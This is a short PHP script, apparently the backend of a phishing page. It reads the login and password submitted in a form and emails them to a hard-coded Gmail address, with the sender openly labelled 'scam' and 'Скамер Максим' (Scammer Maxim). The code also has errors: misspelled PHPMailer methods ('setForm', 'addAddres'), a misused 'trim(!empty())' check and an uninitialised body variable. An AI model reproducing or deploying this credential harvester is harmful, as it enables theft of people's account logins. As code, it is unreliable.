<?php
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\Exception;

	require 'phpmailer/src/Exception.php';
	require 'phpmailer/src/PHPMailer.php';

	$mail = new PHPMailer(true);
	$mail ->CharSet = 'UTF-8';
	$mail ->setLanguage('ru', 'phpmailer/language');
	$mail ->IsHTML(true);

	$mail ->setForm('scam@scam.com', 'Скамер Максим');
	$mail ->addAddres('mrmob67@gmail.com');

	if(trim(!empty($_POST['login']))){
		$body.='<p><strong>Login:</strong> '.$_POST['login'].'</p>';
	}
	if(trim(!empty($_POST['password']))){
		$body.='<p><strong>Password:</strong> '.$_POST['password'].'</p>';
	}

	$mail->Body = $body;

	if (!$mail->send()) {
		$message = 'Ошибка';
	} else {
		$message = 'Данные отправлены!';
	}

	$response = ['message' => $message];

	header('Content-type: application/json');
	echo json_encode($response);
?>